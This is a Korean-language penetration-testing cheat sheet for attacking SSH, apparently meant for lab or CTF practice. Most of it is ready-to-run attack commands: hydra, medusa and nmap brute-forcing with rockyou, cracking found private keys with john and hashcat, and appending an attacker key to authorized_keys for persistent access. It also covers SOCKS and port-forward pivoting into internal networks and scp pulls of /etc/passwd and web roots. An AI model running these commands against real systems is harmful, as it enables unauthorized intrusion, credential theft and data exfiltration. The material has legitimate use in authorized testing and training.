# SSH

# SSH (22)

원격 접속 프로토콜. 브루트포스, 키 기반 인증, 버전 취약점, 터널링이 주요 공격/활용 벡터.

---

## 1. 열거 + 배너그래빙

```bash
# nmap 스크립트
nmap -p 22 --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos <IP>

# 기본 접속 명령어 
ssh <username>@<IP>
ssh -p<PORT> <username>@<IP> # 포트 지정 

# 버전 탐지 (취약점 확인용)
nmap -sV -p 22 <IP>
ssh -V
nc <IP> 22    # 배너 확인

# 허용된 인증 방식 확인
ssh -v user@<IP> 2>&1 | grep "Authentication methods"
```

---

## 2. 브루트포스

```bash
# hydra (가장 보편적)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP> -t 4 -vV

# medusa
medusa -h <IP> -u root -P rockyou.txt -M ssh

# nmap 스크립트
nmap -p 22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt <IP>

# 속도 조절 (락아웃 방지)
hydra -l user -P rockyou.txt ssh://<IP> -t 2 -W 5

# 사용자명 열거 (CVE-2018-15473 — OpenSSH < 7.7)
python3 ssh_user_enum.py --userList users.txt --ip <IP>
```

---

## 3. 키 기반 인증 악용

```bash
# 발견한 개인키로 로그인
chmod 600 id_rsa
ssh -i id_rsa user@<IP>

# 암호화된 키 크랙
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt  # ssh RSA 키
# → 획득한 패스프레이즈로 로그인

# authorized_keys 파일 쓰기 가능할 때
ssh-keygen -t rsa -b 2048 -f /tmp/mykey -N ""
cat /tmp/mykey.pub >> /home/user/.ssh/authorized_keys
ssh -i /tmp/mykey user@<IP>

# 찾을 수 있는 키 파일 경로
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/id_ecdsa
/root/.ssh/id_rsa
/etc/ssh/ssh_host_rsa_key
```

---

## 4. SSH 터널링 (포트 포워딩)

```bash
# Local Port Forward: 칼리의 포트로 타겟 내부 서비스 접근
# 칼리:8080 → 타겟:80 (타겟 내부에서만 접근 가능한 서비스)
ssh -L 8080:localhost:80 user@<IP>
ssh -L 8080:127.0.0.1:80 user@<IP>
# 이후 칼리에서 http://localhost:8080 접근

# 내부 네트워크의 다른 호스트 접근
ssh -L 8080:192.168.1.100:80 user@<IP>

# Remote Port Forward: 타겟이 칼리의 포트에 연결
ssh -R 4444:localhost:4444 user@칼리IP    # 타겟에서 실행

# Dynamic Port Forward (SOCKS 프록시)
ssh -D 1080 user@<IP>
# proxychains 설정: socks5 127.0.0.1 1080
proxychains nmap <내부IP>
proxychains curl http://<내부IP>/

# 백그라운드 + 쉘 없이
ssh -f -N -L 8080:localhost:80 user@<IP>
ssh -f -N -D 1080 user@<IP>
```

---

## 5. SSH 터널 (자격증명 없을 때 — sshuttle)

```bash
# 전체 서브넷을 SSH 통해 라우팅
sshuttle -r user@<IP> 10.10.10.0/24
sshuttle -r user@<IP> 0.0.0.0/0    # 전체 트래픽
```

---

## 6. 버전별 취약점

```bash
# OpenSSH 버전 확인
ssh -V
nmap -sV -p 22 <IP>

# CVE-2023-38408 (OpenSSH < 9.3p2) — ssh-agent 원격 코드 실행
# CVE-2018-15473 (OpenSSH < 7.7) — 사용자명 열거
# CVE-2016-0777 (OpenSSH < 7.1p2) — 메모리 정보 노출
# libssh 인증 우회 (CVE-2018-10933)
python3 -c "import libssh; ..."

# searchsploit
searchsploit openssh <버전>
```

---

## 7. SSH를 통한 파일 전송

```bash
# 보내기
scp local_file.txt user@<IP>:/tmp/
scp -i id_rsa local_file.txt user@<IP>:/tmp/

# 가져오기
scp user@<IP>:/etc/passwd ./passwd
scp -r user@<IP>:/var/www/html/ ./

# rsync
rsync -avz user@<IP>:/var/www/html/ ./backup/
```

---

## 팁

- 버전 정보에서 특정 배포판 정보(Ubuntu, Debian 등) 확인 가능 → 취약점 매핑
- SSH 포트가 22가 아닐 수 있음 → `p <포트>` 옵션
- 쉘 없는 계정이더라도 포트 포워딩은 가능한 경우 있음
- `~/.ssh/config` 파일에 저장된 다른 호스트 정보 확인